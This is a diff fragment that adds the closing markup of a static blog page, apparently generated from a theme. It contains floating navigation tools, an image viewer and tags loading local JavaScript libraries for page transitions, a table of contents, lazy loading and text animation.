+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
